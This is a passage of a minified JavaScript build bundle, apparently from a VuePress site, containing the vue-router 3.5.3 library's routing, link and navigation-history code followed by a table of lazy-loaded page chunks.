u=o.$vnode?o.$vnode.data:{};u.routerView&&p++,u.keepAlive&&o._directInactive&&o._inactive&&(d=!0),o=o.$parent}if(a.routerViewDepth=p,d){var m=l[s],f=m&&m.component;return f?(m.configProps&&na(f,a,m.route,m.configProps),i(f,a,r)):i()}var g=c.matched[p],b=g&&g.components[s];if(!g||!b)return l[s]=null,i();l[s]={component:b},a.registerRouteInstance=function(n,e){var t=g.instances[s];(e&&t!==n||!e&&t===n)&&(g.instances[s]=e)},(a.hook||(a.hook={})).prepatch=function(n,e){g.instances[s]=e.componentInstance},a.hook.init=function(n){n.data.keepAlive&&n.componentInstance&&n.componentInstance!==g.instances[s]&&(g.instances[s]=n.componentInstance),Qo(c)};var h=g.props&&g.props[s];return h&&(Mo(l[s],{route:c,configProps:h}),na(b,a,c,h)),i(b,a,r)}};function na(n,e,t,r){var o=e.props=function(n,e){switch(typeof e){case"undefined":return;case"object":return e;case"function":return e(n);case"boolean":return e?n.params:void 0;default:0}}(t,r);if(o){o=e.props=Mo({},o);var a=e.attrs=e.attrs||{};for(var i in o)n.props&&i in n.props||(a[i]=o[i],delete o[i])}}function ea(n,e,t){var r=n.charAt(0);if("/"===r)return n;if("?"===r||"#"===r)return e+n;var o=e.split("/");t&&o[o.length-1]||o.pop();for(var a=n.replace(/^\//,"").split("/"),i=0;i<a.length;i++){var s=a[i];".."===s?o.pop():"."!==s&&o.push(s)}return""!==o[0]&&o.unshift(""),o.join("/")}function ta(n){return n.replace(/\/+/g,"/")}var ra=Array.isArray||function(n){return"[object Array]"==Object.prototype.toString.call(n)},oa=va,aa=pa,ia=function(n,e){return ua(pa(n,e),e)},sa=ua,ca=ha,la=new RegExp(["(\\\\.)","([\\/.])?(?:(?:\\:(\\w+)(?:\\(((?:\\\\.|[^\\\\()])+)\\))?|\\(((?:\\\\.|[^\\\\()])+)\\))([+*?])?|(\\*))"].join("|"),"g");function pa(n,e){for(var t,r=[],o=0,a=0,i="",s=e&&e.delimiter||"/";null!=(t=la.exec(n));){var c=t[0],l=t[1],p=t.index;if(i+=n.slice(a,p),a=p+c.length,l)i+=l[1];else{var d=n[a],u=t[2],m=t[3],f=t[4],g=t[5],b=t[6],h=t[7];i&&(r.push(i),i="");var v=null!=u&&null!=d&&d!==u,y="+"===b||"*"===b,k="?"===b||"*"===b,x=t[2]||s,w=f||g;r.push({name:m||o++,prefix:u||"",delimiter:x,optional:k,repeat:y,partial:v,asterisk:!!h,pattern:w?fa(w):h?".*":"[^"+ma(x)+"]+?"})}}return a<n.length&&(i+=n.substr(a)),i&&r.push(i),r}function da(n){return encodeURI(n).replace(/[\/?#]/g,(function(n){return"%"+n.charCodeAt(0).toString(16).toUpperCase()}))}function ua(n,e){for(var t=new Array(n.length),r=0;r<n.length;r++)"object"==typeof n[r]&&(t[r]=new RegExp("^(?:"+n[r].pattern+")$",ba(e)));return function(e,r){for(var o="",a=e||{},i=(r||{}).pretty?da:encodeURIComponent,s=0;s<n.length;s++){var c=n[s];if("string"!=typeof c){var l,p=a[c.name];if(null==p){if(c.optional){c.partial&&(o+=c.prefix);continue}throw new TypeError('Expected "'+c.name+'" to be defined')}if(ra(p)){if(!c.repeat)throw new TypeError('Expected "'+c.name+'" to not repeat, but received `'+JSON.stringify(p)+"`");if(0===p.length){if(c.optional)continue;throw new TypeError('Expected "'+c.name+'" to not be empty')}for(var d=0;d<p.length;d++){if(l=i(p[d]),!t[s].test(l))throw new TypeError('Expected all "'+c.name+'" to match "'+c.pattern+'", but received `'+JSON.stringify(l)+"`");o+=(0===d?c.prefix:c.delimiter)+l}}else{if(l=c.asterisk?encodeURI(p).replace(/[?#]/g,(function(n){return"%"+n.charCodeAt(0).toString(16).toUpperCase()})):i(p),!t[s].test(l))throw new TypeError('Expected "'+c.name+'" to match "'+c.pattern+'", but received "'+l+'"');o+=c.prefix+l}}else o+=c}return o}}function ma(n){return n.replace(/([.+*?=^!:${}()[\]|\/\\])/g,"\\$1")}function fa(n){return n.replace(/([=!:$\/()])/g,"\\$1")}function ga(n,e){return n.keys=e,n}function ba(n){return n&&n.sensitive?"":"i"}function ha(n,e,t){ra(e)||(t=e||t,e=[]);for(var r=(t=t||{}).strict,o=!1!==t.end,a="",i=0;i<n.length;i++){var s=n[i];if("string"==typeof s)a+=ma(s);else{var c=ma(s.prefix),l="(?:"+s.pattern+")";e.push(s),s.repeat&&(l+="(?:"+c+l+")*"),a+=l=s.optional?s.partial?c+"("+l+")?":"(?:"+c+"("+l+"))?":c+"("+l+")"}}var p=ma(t.delimiter||"/"),d=a.slice(-p.length)===p;return r||(a=(d?a.slice(0,-p.length):a)+"(?:"+p+"(?=$))?"),a+=o?"$":r&&d?"":"(?="+p+"|$)",ga(new RegExp("^"+a,ba(t)),e)}function va(n,e,t){return ra(e)||(t=e||t,e=[]),t=t||{},n instanceof RegExp?function(n,e){var t=n.source.match(/\((?!\?)/g);if(t)for(var r=0;r<t.length;r++)e.push({name:r,prefix:null,delimiter:null,optional:!1,repeat:!1,partial:!1,asterisk:!1,pattern:null});return ga(n,e)}(n,e):ra(n)?function(n,e,t){for(var r=[],o=0;o<n.length;o++)r.push(va(n[o],e,t).source);return ga(new RegExp("(?:"+r.join("|")+")",ba(t)),e)}(n,e,t):function(n,e,t){return ha(pa(n,t),e,t)}(n,e,t)}oa.parse=aa,oa.compile=ia,oa.tokensToFunction=sa,oa.tokensToRegExp=ca;var ya=Object.create(null);function ka(n,e,t){e=e||{};try{var r=ya[n]||(ya[n]=oa.compile(n));return"string"==typeof e.pathMatch&&(e[0]=e.pathMatch),r(e,{pretty:!0})}catch(n){return""}finally{delete e[0]}}function xa(n,e,t,r){var o="string"==typeof n?{path:n}:n;if(o._normalized)return o;if(o.name){var a=(o=Mo({},n)).params;return a&&"object"==typeof a&&(o.params=Mo({},a)),o}if(!o.path&&o.params&&e){(o=Mo({},o))._normalized=!0;var i=Mo(Mo({},e.params),o.params);if(e.name)o.name=e.name,o.params=i;else if(e.matched.length){var s=e.matched[e.matched.length-1].path;o.path=ka(s,i,e.path)}else 0;return o}var c=function(n){var e="",t="",r=n.indexOf("#");r>=0&&(e=n.slice(r),n=n.slice(0,r));var o=n.indexOf("?");return o>=0&&(t=n.slice(o+1),n=n.slice(0,o)),{path:n,query:t,hash:e}}(o.path||""),l=e&&e.path||"/",p=c.path?ea(c.path,l,t||o.append):l,d=function(n,e,t){void 0===e&&(e={});var r,o=t||Fo;try{r=o(n||"")}catch(n){r={}}for(var a in e){var i=e[a];r[a]=Array.isArray(i)?i.map($o):$o(i)}return r}(c.query,o.query,r&&r.options.parseQuery),u=o.hash||c.hash;return u&&"#"!==u.charAt(0)&&(u="#"+u),{_normalized:!0,path:p,query:d,hash:u}}var wa,ja=function(){},Sa={name:"RouterLink",props:{to:{type:[String,Object],required:!0},tag:{type:String,default:"a"},custom:Boolean,exact:Boolean,exactPath:Boolean,append:Boolean,replace:Boolean,activeClass:String,exactActiveClass:String,ariaCurrentValue:{type:String,default:"page"},event:{type:[String,Array],default:"click"}},render:function(n){var e=this,t=this.$router,r=this.$route,o=t.resolve(this.to,r,this.append),a=o.location,i=o.route,s=o.href,c={},l=t.options.linkActiveClass,p=t.options.linkExactActiveClass,d=null==l?"router-link-active":l,u=null==p?"router-link-exact-active":p,m=null==this.activeClass?d:this.activeClass,f=null==this.exactActiveClass?u:this.exactActiveClass,g=i.redirectedFrom?Jo(null,xa(i.redirectedFrom),null,t):i;c[f]=Yo(r,g,this.exactPath),c[m]=this.exact||this.exactPath?c[f]:function(n,e){return 0===n.path.replace(Vo,"/").indexOf(e.path.replace(Vo,"/"))&&(!e.hash||n.hash===e.hash)&&function(n,e){for(var t in e)if(!(t in n))return!1;return!0}(n.query,e.query)}(r,g);var b=c[f]?this.ariaCurrentValue:null,h=function(n){Ea(n)&&(e.replace?t.replace(a,ja):t.push(a,ja))},v={click:Ea};Array.isArray(this.event)?this.event.forEach((function(n){v[n]=h})):v[this.event]=h;var y={class:c},k=!this.$scopedSlots.$hasNormal&&this.$scopedSlots.default&&this.$scopedSlots.default({href:s,route:i,navigate:h,isActive:c[m],isExactActive:c[f]});if(k){if(1===k.length)return k[0];if(k.length>1||!k.length)return 0===k.length?n():n("span",{},k)}if("a"===this.tag)y.on=v,y.attrs={href:s,"aria-current":b};else{var x=function n(e){var t;if(e)for(var r=0;r<e.length;r++){if("a"===(t=e[r]).tag)return t;if(t.children&&(t=n(t.children)))return t}}(this.$slots.default);if(x){x.isStatic=!1;var w=x.data=Mo({},x.data);for(var j in w.on=w.on||{},w.on){var S=w.on[j];j in v&&(w.on[j]=Array.isArray(S)?S:[S])}for(var E in v)E in w.on?w.on[E].push(v[E]):w.on[E]=h;var A=x.data.attrs=Mo({},x.data.attrs);A.href=s,A["aria-current"]=b}else y.on=v}return n(this.tag,y,this.$slots.default)}};function Ea(n){if(!(n.metaKey||n.altKey||n.ctrlKey||n.shiftKey||n.defaultPrevented||void 0!==n.button&&0!==n.button)){if(n.currentTarget&&n.currentTarget.getAttribute){var e=n.currentTarget.getAttribute("target");if(/\b_blank\b/i.test(e))return}return n.preventDefault&&n.preventDefault(),!0}}var Aa="undefined"!=typeof window;function Pa(n,e,t,r,o){var a=e||[],i=t||Object.create(null),s=r||Object.create(null);n.forEach((function(n){!function n(e,t,r,o,a,i){var s=o.path,c=o.name;0;var l=o.pathToRegexpOptions||{},p=function(n,e,t){t||(n=n.replace(/\/$/,""));if("/"===n[0])return n;if(null==e)return n;return ta(e.path+"/"+n)}(s,a,l.strict);"boolean"==typeof o.caseSensitive&&(l.sensitive=o.caseSensitive);var d={path:p,regex:Ca(p,l),components:o.components||{default:o.component},alias:o.alias?"string"==typeof o.alias?[o.alias]:o.alias:[],instances:{},enteredCbs:{},name:c,parent:a,matchAs:i,redirect:o.redirect,beforeEnter:o.beforeEnter,meta:o.meta||{},props:null==o.props?{}:o.components?o.props:{default:o.props}};o.children&&o.children.forEach((function(o){var a=i?ta(i+"/"+o.path):void 0;n(e,t,r,o,d,a)}));t[d.path]||(e.push(d.path),t[d.path]=d);if(void 0!==o.alias)for(var u=Array.isArray(o.alias)?o.alias:[o.alias],m=0;m<u.length;++m){0;var f={path:u[m],children:o.children};n(e,t,r,f,a,d.path||"/")}c&&(r[c]||(r[c]=d))}(a,i,s,n,o)}));for(var c=0,l=a.length;c<l;c++)"*"===a[c]&&(a.push(a.splice(c,1)[0]),l--,c--);return{pathList:a,pathMap:i,nameMap:s}}function Ca(n,e){return oa(n,[],e)}function Ta(n,e){var t=Pa(n),r=t.pathList,o=t.pathMap,a=t.nameMap;function i(n,t,i){var s=xa(n,t,!1,e),l=s.name;if(l){var p=a[l];if(!p)return c(null,s);var d=p.regex.keys.filter((function(n){return!n.optional})).map((function(n){return n.name}));if("object"!=typeof s.params&&(s.params={}),t&&"object"==typeof t.params)for(var u in t.params)!(u in s.params)&&d.indexOf(u)>-1&&(s.params[u]=t.params[u]);return s.path=ka(p.path,s.params),c(p,s,i)}if(s.path){s.params={};for(var m=0;m<r.length;m++){var f=r[m],g=o[f];if(Ia(g.regex,s.path,s.params))return c(g,s,i)}}return c(null,s)}function s(n,t){var r=n.redirect,o="function"==typeof r?r(Jo(n,t,null,e)):r;if("string"==typeof o&&(o={path:o}),!o||"object"!=typeof o)return c(null,t);var s=o,l=s.name,p=s.path,d=t.query,u=t.hash,m=t.params;if(d=s.hasOwnProperty("query")?s.query:d,u=s.hasOwnProperty("hash")?s.hash:u,m=s.hasOwnProperty("params")?s.params:m,l){a[l];return i({_normalized:!0,name:l,query:d,hash:u,params:m},void 0,t)}if(p){var f=function(n,e){return ea(n,e.parent?e.parent.path:"/",!0)}(p,n);return i({_normalized:!0,path:ka(f,m),query:d,hash:u},void 0,t)}return c(null,t)}function c(n,t,r){return n&&n.redirect?s(n,r||t):n&&n.matchAs?function(n,e,t){var r=i({_normalized:!0,path:ka(t,e.params)});if(r){var o=r.matched,a=o[o.length-1];return e.params=r.params,c(a,e)}return c(null,e)}(0,t,n.matchAs):Jo(n,t,r,e)}return{match:i,addRoute:function(n,e){var t="object"!=typeof n?a[n]:void 0;Pa([e||n],r,o,a,t),t&&t.alias.length&&Pa(t.alias.map((function(n){return{path:n,children:[e]}})),r,o,a,t)},getRoutes:function(){return r.map((function(n){return o[n]}))},addRoutes:function(n){Pa(n,r,o,a)}}}function Ia(n,e,t){var r=e.match(n);if(!r)return!1;if(!t)return!0;for(var o=1,a=r.length;o<a;++o){var i=n.keys[o-1];i&&(t[i.name||"pathMatch"]="string"==typeof r[o]?qo(r[o]):r[o])}return!0}var _a=Aa&&window.performance&&window.performance.now?window.performance:Date;function Ba(){return _a.now().toFixed(3)}var Oa=Ba();function Ra(){return Oa}function Ma(n){return Oa=n}var Da=Object.create(null);function Na(){"scrollRestoration"in window.history&&(window.history.scrollRestoration="manual");var n=window.location.protocol+"//"+window.location.host,e=window.location.href.replace(n,""),t=Mo({},window.history.state);return t.key=Ra(),window.history.replaceState(t,"",e),window.addEventListener("popstate",qa),function(){window.removeEventListener("popstate",qa)}}function za(n,e,t,r){if(n.app){var o=n.options.scrollBehavior;o&&n.app.$nextTick((function(){var a=function(){var n=Ra();if(n)return Da[n]}(),i=o.call(n,e,t,r?a:null);i&&("function"==typeof i.then?i.then((function(n){Ja(n,a)})).catch((function(n){0})):Ja(i,a))}))}}function La(){var n=Ra();n&&(Da[n]={x:window.pageXOffset,y:window.pageYOffset})}function qa(n){La(),n.state&&n.state.key&&Ma(n.state.key)}function $a(n){return Ua(n.x)||Ua(n.y)}function Fa(n){return{x:Ua(n.x)?n.x:window.pageXOffset,y:Ua(n.y)?n.y:window.pageYOffset}}function Ua(n){return"number"==typeof n}var Va=/^#\d/;function Ja(n,e){var t,r="object"==typeof n;if(r&&"string"==typeof n.selector){var o=Va.test(n.selector)?document.getElementById(n.selector.slice(1)):document.querySelector(n.selector);if(o){var a=n.offset&&"object"==typeof n.offset?n.offset:{};e=function(n,e){var t=document.documentElement.getBoundingClientRect(),r=n.getBoundingClientRect();return{x:r.left-t.left-e.x,y:r.top-t.top-e.y}}(o,a={x:Ua((t=a).x)?t.x:0,y:Ua(t.y)?t.y:0})}else $a(n)&&(e=Fa(n))}else r&&$a(n)&&(e=Fa(n));e&&("scrollBehavior"in document.documentElement.style?window.scrollTo({left:e.x,top:e.y,behavior:n.behavior}):window.scrollTo(e.x,e.y))}var Ha,Ga=Aa&&((-1===(Ha=window.navigator.userAgent).indexOf("Android 2.")&&-1===Ha.indexOf("Android 4.0")||-1===Ha.indexOf("Mobile Safari")||-1!==Ha.indexOf("Chrome")||-1!==Ha.indexOf("Windows Phone"))&&window.history&&"function"==typeof window.history.pushState);function Wa(n,e){La();var t=window.history;try{if(e){var r=Mo({},t.state);r.key=Ra(),t.replaceState(r,"",n)}else t.pushState({key:Ma(Ba())},"",n)}catch(t){window.location[e?"replace":"assign"](n)}}function Ka(n){Wa(n,!0)}function Ya(n,e,t){var r=function(o){o>=n.length?t():n[o]?e(n[o],(function(){r(o+1)})):r(o+1)};r(0)}var Xa={redirected:2,aborted:4,cancelled:8,duplicated:16};function Qa(n,e){return ni(n,e,Xa.redirected,'Redirected when going from "'+n.fullPath+'" to "'+function(n){if("string"==typeof n)return n;if("path"in n)return n.path;var e={};return ei.forEach((function(t){t in n&&(e[t]=n[t])})),JSON.stringify(e,null,2)}(e)+'" via a navigation guard.')}function Za(n,e){return ni(n,e,Xa.cancelled,'Navigation cancelled from "'+n.fullPath+'" to "'+e.fullPath+'" with a new navigation.')}function ni(n,e,t,r){var o=new Error(r);return o._isRouter=!0,o.from=n,o.to=e,o.type=t,o}var ei=["params","query","hash"];function ti(n){return Object.prototype.toString.call(n).indexOf("Error")>-1}function ri(n,e){return ti(n)&&n._isRouter&&(null==e||n.type===e)}function oi(n){return function(e,t,r){var o=!1,a=0,i=null;ai(n,(function(n,e,t,s){if("function"==typeof n&&void 0===n.cid){o=!0,a++;var c,l=ci((function(e){var o;((o=e).__esModule||si&&"Module"===o[Symbol.toStringTag])&&(e=e.default),n.resolved="function"==typeof e?e:wa.extend(e),t.components[s]=e,--a<=0&&r()})),p=ci((function(n){var e="Failed to resolve async component "+s+": "+n;i||(i=ti(n)?n:new Error(e),r(i))}));try{c=n(l,p)}catch(n){p(n)}if(c)if("function"==typeof c.then)c.then(l,p);else{var d=c.component;d&&"function"==typeof d.then&&d.then(l,p)}}})),o||r()}}function ai(n,e){return ii(n.map((function(n){return Object.keys(n.components).map((function(t){return e(n.components[t],n.instances[t],n,t)}))})))}function ii(n){return Array.prototype.concat.apply([],n)}var si="function"==typeof Symbol&&"symbol"==typeof Symbol.toStringTag;function ci(n){var e=!1;return function(){for(var t=[],r=arguments.length;r--;)t[r]=arguments[r];if(!e)return e=!0,n.apply(this,t)}}var li=function(n,e){this.router=n,this.base=function(n){if(!n)if(Aa){var e=document.querySelector("base");n=(n=e&&e.getAttribute("href")||"/").replace(/^https?:\/\/[^\/]+/,"")}else n="/";"/"!==n.charAt(0)&&(n="/"+n);return n.replace(/\/$/,"")}(e),this.current=Go,this.pending=null,this.ready=!1,this.readyCbs=[],this.readyErrorCbs=[],this.errorCbs=[],this.listeners=[]};function pi(n,e,t,r){var o=ai(n,(function(n,r,o,a){var i=function(n,e){"function"!=typeof n&&(n=wa.extend(n));return n.options[e]}(n,e);if(i)return Array.isArray(i)?i.map((function(n){return t(n,r,o,a)})):t(i,r,o,a)}));return ii(r?o.reverse():o)}function di(n,e){if(e)return function(){return n.apply(e,arguments)}}li.prototype.listen=function(n){this.cb=n},li.prototype.onReady=function(n,e){this.ready?n():(this.readyCbs.push(n),e&&this.readyErrorCbs.push(e))},li.prototype.onError=function(n){this.errorCbs.push(n)},li.prototype.transitionTo=function(n,e,t){var r,o=this;try{r=this.router.match(n,this.current)}catch(n){throw this.errorCbs.forEach((function(e){e(n)})),n}var a=this.current;this.confirmTransition(r,(function(){o.updateRoute(r),e&&e(r),o.ensureURL(),o.router.afterHooks.forEach((function(n){n&&n(r,a)})),o.ready||(o.ready=!0,o.readyCbs.forEach((function(n){n(r)})))}),(function(n){t&&t(n),n&&!o.ready&&(ri(n,Xa.redirected)&&a===Go||(o.ready=!0,o.readyErrorCbs.forEach((function(e){e(n)}))))}))},li.prototype.confirmTransition=function(n,e,t){var r=this,o=this.current;this.pending=n;var a,i,s=function(n){!ri(n)&&ti(n)&&(r.errorCbs.length?r.errorCbs.forEach((function(e){e(n)})):console.error(n)),t&&t(n)},c=n.matched.length-1,l=o.matched.length-1;if(Yo(n,o)&&c===l&&n.matched[c]===o.matched[l])return this.ensureURL(),n.hash&&za(this.router,o,n,!1),s(((i=ni(a=o,n,Xa.duplicated,'Avoided redundant navigation to current location: "'+a.fullPath+'".')).name="NavigationDuplicated",i));var p=function(n,e){var t,r=Math.max(n.length,e.length);for(t=0;t<r&&n[t]===e[t];t++);return{updated:e.slice(0,t),activated:e.slice(t),deactivated:n.slice(t)}}(this.current.matched,n.matched),d=p.updated,u=p.deactivated,m=p.activated,f=[].concat(function(n){return pi(n,"beforeRouteLeave",di,!0)}(u),this.router.beforeHooks,function(n){return pi(n,"beforeRouteUpdate",di)}(d),m.map((function(n){return n.beforeEnter})),oi(m)),g=function(e,t){if(r.pending!==n)return s(Za(o,n));try{e(n,o,(function(e){!1===e?(r.ensureURL(!0),s(function(n,e){return ni(n,e,Xa.aborted,'Navigation aborted from "'+n.fullPath+'" to "'+e.fullPath+'" via a navigation guard.')}(o,n))):ti(e)?(r.ensureURL(!0),s(e)):"string"==typeof e||"object"==typeof e&&("string"==typeof e.path||"string"==typeof e.name)?(s(Qa(o,n)),"object"==typeof e&&e.replace?r.replace(e):r.push(e)):t(e)}))}catch(n){s(n)}};Ya(f,g,(function(){Ya(function(n){return pi(n,"beforeRouteEnter",(function(n,e,t,r){return function(n,e,t){return function(r,o,a){return n(r,o,(function(n){"function"==typeof n&&(e.enteredCbs[t]||(e.enteredCbs[t]=[]),e.enteredCbs[t].push(n)),a(n)}))}}(n,t,r)}))}(m).concat(r.router.resolveHooks),g,(function(){if(r.pending!==n)return s(Za(o,n));r.pending=null,e(n),r.router.app&&r.router.app.$nextTick((function(){Qo(n)}))}))}))},li.prototype.updateRoute=function(n){this.current=n,this.cb&&this.cb(n)},li.prototype.setupListeners=function(){},li.prototype.teardown=function(){this.listeners.forEach((function(n){n()})),this.listeners=[],this.current=Go,this.pending=null};var ui=function(n){function e(e,t){n.call(this,e,t),this._startLocation=mi(this.base)}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.setupListeners=function(){var n=this;if(!(this.listeners.length>0)){var e=this.router,t=e.options.scrollBehavior,r=Ga&&t;r&&this.listeners.push(Na());var o=function(){var t=n.current,o=mi(n.base);n.current===Go&&o===n._startLocation||n.transitionTo(o,(function(n){r&&za(e,n,t,!0)}))};window.addEventListener("popstate",o),this.listeners.push((function(){window.removeEventListener("popstate",o)}))}},e.prototype.go=function(n){window.history.go(n)},e.prototype.push=function(n,e,t){var r=this,o=this.current;this.transitionTo(n,(function(n){Wa(ta(r.base+n.fullPath)),za(r.router,n,o,!1),e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this,o=this.current;this.transitionTo(n,(function(n){Ka(ta(r.base+n.fullPath)),za(r.router,n,o,!1),e&&e(n)}),t)},e.prototype.ensureURL=function(n){if(mi(this.base)!==this.current.fullPath){var e=ta(this.base+this.current.fullPath);n?Wa(e):Ka(e)}},e.prototype.getCurrentLocation=function(){return mi(this.base)},e}(li);function mi(n){var e=window.location.pathname,t=e.toLowerCase(),r=n.toLowerCase();return!n||t!==r&&0!==t.indexOf(ta(r+"/"))||(e=e.slice(n.length)),(e||"/")+window.location.search+window.location.hash}var fi=function(n){function e(e,t,r){n.call(this,e,t),r&&function(n){var e=mi(n);if(!/^\/#/.test(e))return window.location.replace(ta(n+"/#"+e)),!0}(this.base)||gi()}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.setupListeners=function(){var n=this;if(!(this.listeners.length>0)){var e=this.router.options.scrollBehavior,t=Ga&&e;t&&this.listeners.push(Na());var r=function(){var e=n.current;gi()&&n.transitionTo(bi(),(function(r){t&&za(n.router,r,e,!0),Ga||yi(r.fullPath)}))},o=Ga?"popstate":"hashchange";window.addEventListener(o,r),this.listeners.push((function(){window.removeEventListener(o,r)}))}},e.prototype.push=function(n,e,t){var r=this,o=this.current;this.transitionTo(n,(function(n){vi(n.fullPath),za(r.router,n,o,!1),e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this,o=this.current;this.transitionTo(n,(function(n){yi(n.fullPath),za(r.router,n,o,!1),e&&e(n)}),t)},e.prototype.go=function(n){window.history.go(n)},e.prototype.ensureURL=function(n){var e=this.current.fullPath;bi()!==e&&(n?vi(e):yi(e))},e.prototype.getCurrentLocation=function(){return bi()},e}(li);function gi(){var n=bi();return"/"===n.charAt(0)||(yi("/"+n),!1)}function bi(){var n=window.location.href,e=n.indexOf("#");return e<0?"":n=n.slice(e+1)}function hi(n){var e=window.location.href,t=e.indexOf("#");return(t>=0?e.slice(0,t):e)+"#"+n}function vi(n){Ga?Wa(hi(n)):window.location.hash=n}function yi(n){Ga?Ka(hi(n)):window.location.replace(hi(n))}var ki=function(n){function e(e,t){n.call(this,e,t),this.stack=[],this.index=-1}return n&&(e.__proto__=n),e.prototype=Object.create(n&&n.prototype),e.prototype.constructor=e,e.prototype.push=function(n,e,t){var r=this;this.transitionTo(n,(function(n){r.stack=r.stack.slice(0,r.index+1).concat(n),r.index++,e&&e(n)}),t)},e.prototype.replace=function(n,e,t){var r=this;this.transitionTo(n,(function(n){r.stack=r.stack.slice(0,r.index).concat(n),e&&e(n)}),t)},e.prototype.go=function(n){var e=this,t=this.index+n;if(!(t<0||t>=this.stack.length)){var r=this.stack[t];this.confirmTransition(r,(function(){var n=e.current;e.index=t,e.updateRoute(r),e.router.afterHooks.forEach((function(e){e&&e(r,n)}))}),(function(n){ri(n,Xa.duplicated)&&(e.index=t)}))}},e.prototype.getCurrentLocation=function(){var n=this.stack[this.stack.length-1];return n?n.fullPath:"/"},e.prototype.ensureURL=function(){},e}(li),xi=function(n){void 0===n&&(n={}),this.app=null,this.apps=[],this.options=n,this.beforeHooks=[],this.resolveHooks=[],this.afterHooks=[],this.matcher=Ta(n.routes||[],this);var e=n.mode||"hash";switch(this.fallback="history"===e&&!Ga&&!1!==n.fallback,this.fallback&&(e="hash"),Aa||(e="abstract"),this.mode=e,e){case"history":this.history=new ui(this,n.base);break;case"hash":this.history=new fi(this,n.base,this.fallback);break;case"abstract":this.history=new ki(this,n.base);break;default:0}},wi={currentRoute:{configurable:!0}};function ji(n,e){return n.push(e),function(){var t=n.indexOf(e);t>-1&&n.splice(t,1)}}xi.prototype.match=function(n,e,t){return this.matcher.match(n,e,t)},wi.currentRoute.get=function(){return this.history&&this.history.current},xi.prototype.init=function(n){var e=this;if(this.apps.push(n),n.$once("hook:destroyed",(function(){var t=e.apps.indexOf(n);t>-1&&e.apps.splice(t,1),e.app===n&&(e.app=e.apps[0]||null),e.app||e.history.teardown()})),!this.app){this.app=n;var t=this.history;if(t instanceof ui||t instanceof fi){var r=function(n){t.setupListeners(),function(n){var r=t.current,o=e.options.scrollBehavior;Ga&&o&&"fullPath"in n&&za(e,n,r,!1)}(n)};t.transitionTo(t.getCurrentLocation(),r,r)}t.listen((function(n){e.apps.forEach((function(e){e._route=n}))}))}},xi.prototype.beforeEach=function(n){return ji(this.beforeHooks,n)},xi.prototype.beforeResolve=function(n){return ji(this.resolveHooks,n)},xi.prototype.afterEach=function(n){return ji(this.afterHooks,n)},xi.prototype.onReady=function(n,e){this.history.onReady(n,e)},xi.prototype.onError=function(n){this.history.onError(n)},xi.prototype.push=function(n,e,t){var r=this;if(!e&&!t&&"undefined"!=typeof Promise)return new Promise((function(e,t){r.history.push(n,e,t)}));this.history.push(n,e,t)},xi.prototype.replace=function(n,e,t){var r=this;if(!e&&!t&&"undefined"!=typeof Promise)return new Promise((function(e,t){r.history.replace(n,e,t)}));this.history.replace(n,e,t)},xi.prototype.go=function(n){this.history.go(n)},xi.prototype.back=function(){this.go(-1)},xi.prototype.forward=function(){this.go(1)},xi.prototype.getMatchedComponents=function(n){var e=n?n.matched?n:this.resolve(n).route:this.currentRoute;return e?[].concat.apply([],e.matched.map((function(n){return Object.keys(n.components).map((function(e){return n.components[e]}))}))):[]},xi.prototype.resolve=function(n,e,t){var r=xa(n,e=e||this.history.current,t,this),o=this.match(r,e),a=o.redirectedFrom||o.fullPath;return{location:r,route:o,href:function(n,e,t){var r="hash"===t?"#"+e:e;return n?ta(n+"/"+r):r}(this.history.base,a,this.mode),normalizedTo:r,resolved:o}},xi.prototype.getRoutes=function(){return this.matcher.getRoutes()},xi.prototype.addRoute=function(n,e){this.matcher.addRoute(n,e),this.history.current!==Go&&this.history.transitionTo(this.history.getCurrentLocation())},xi.prototype.addRoutes=function(n){this.matcher.addRoutes(n),this.history.current!==Go&&this.history.transitionTo(this.history.getCurrentLocation())},Object.defineProperties(xi.prototype,wi),xi.install=function n(e){if(!n.installed||wa!==e){n.installed=!0,wa=e;var t=function(n){return void 0!==n},r=function(n,e){var r=n.$options._parentVnode;t(r)&&t(r=r.data)&&t(r=r.registerRouteInstance)&&r(n,e)};e.mixin({beforeCreate:function(){t(this.$options.router)?(this._routerRoot=this,this._router=this.$options.router,this._router.init(this),e.util.defineReactive(this,"_route",this._router.history.current)):this._routerRoot=this.$parent&&this.$parent._routerRoot||this,r(this,this)},destroyed:function(){r(this)}}),Object.defineProperty(e.prototype,"$router",{get:function(){return this._routerRoot._router}}),Object.defineProperty(e.prototype,"$route",{get:function(){return this._routerRoot._route}}),e.component("RouterView",Zo),e.component("RouterLink",Sa);var o=e.config.optionMergeStrategies;o.beforeRouteEnter=o.beforeRouteLeave=o.beforeRouteUpdate=o.created}},xi.version="3.5.3",xi.isNavigationFailure=ri,xi.NavigationFailureType=Xa,xi.START_LOCATION=Go,Aa&&window.Vue&&window.Vue.use(xi);var Si=xi;t(182),t(183),t(258),t(46),t(260),t(26),t(27),t(261);function Ei(n){n.locales&&Object.keys(n.locales).forEach((function(e){n.locales[e].path=e})),Object.freeze(n)}t(74),t(97),t(134);function Ai(n){return(Ai="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&&"function"==typeof Symbol&&n.constructor===Symbol&&n!==Symbol.prototype?"symbol":typeof n})(n)}var Pi=t(76),Ci=(t(192),t(28),t(53),t(232),t(233),t(48),t(30),{NotFound:function(){return Promise.all([t.e(1),t.e(13)]).then(t.bind(null,490))},Layout:function(){return Promise.all([t.e(1),t.e(11)]).then(t.bind(null,489))}}),Ti={"v-4a355d2a":function(){return t.e(14).then(t.bind(null,491))},"v-104240f2":function(){return t.e(15).then(t.bind(null,492))},"v-2acc2292":function(){return t.e(16).then(t.bind(null,493))},"v-5ba1bd3a":function(){return t.e(17).then(t.bind(null,494))},"v-1a1b5d5b":function(){return t.e(18).then(t.bind(null,495))},"v-c10cfd86":function(){return t.e(19).then(t.bind(null,496))},"v-c385f750":function(){return t.e(20).then(t.bind(null,497))},"v-1e178af1":function(){return t.e(21).then(t.bind(null,498))},"v-7b24cf72":function(){return t.e(22).then(t.bind(null,499))},"v-7c3f2df1":function(){return t.e(23).then(t.bind(null,500))},"v-b3b797ce":function(){return t.e(24).then(t.bind(null,501))},"v-06ddce46":function(){return t.e(25).then(t.bind(null,502))},"v-63e5293d":function(){return t.e(26).then(t.bind(null,503))},"v-4eb895bc":function(){return 